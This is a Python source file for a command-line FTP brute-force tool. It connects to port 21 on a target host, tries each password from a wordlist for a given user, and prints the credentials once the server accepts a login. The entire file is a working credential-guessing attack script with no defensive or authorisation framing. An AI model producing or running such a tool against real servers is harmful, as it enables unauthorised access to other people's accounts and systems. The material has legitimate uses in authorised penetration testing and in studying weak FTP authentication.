import os
import socket
import argparse
from sys import exit

class BruteFTB(object):
    def __init__(self, host, user, wordlist):
        self.user = user
        self.host = host
        self.wordlist = wordlist
    
    def Checkout(self):
        
        with open(self.wordlist, "r") as wordlist:
            read = wordlist.readlines()
        
            for line in read:
                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sc.connect((self.host, 21))
                sc.recv(1024)

                sc.send("USER {0}\r\n".format(self.user))
                sc.recv(1024)
                sc.send("PASS {0}\r\n".format(line.strip()))
                
                r = sc.recv(1024)
                sc.send("QUIT\r\n")

                if "230 Login successful" in r:
                    print("----------Successful----------")
                    print("Target: {0}".format(self.host))
                    print("Username: {0}".format(self.user))
                    print("Password: {0}".format(line.strip()))
                    print("------------------------------")
                    exit(0)

def main():

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--host',     action="store", dest="host",\
                          required=True)
   
    parser.add_argument("--user",     action="store", dest="user",\
                          required=True)
   
    parser.add_argument("--wordlist", action="store", dest="wordlist",\
                          required=True)

    given_args = parser.parse_args()

    host     = given_args.host
    user     = given_args.user
    wordlist = given_args.wordlist

    FTP = BruteFTB(host, user, wordlist)
    FTP.Checkout()

if __name__=='__main__':
    main()
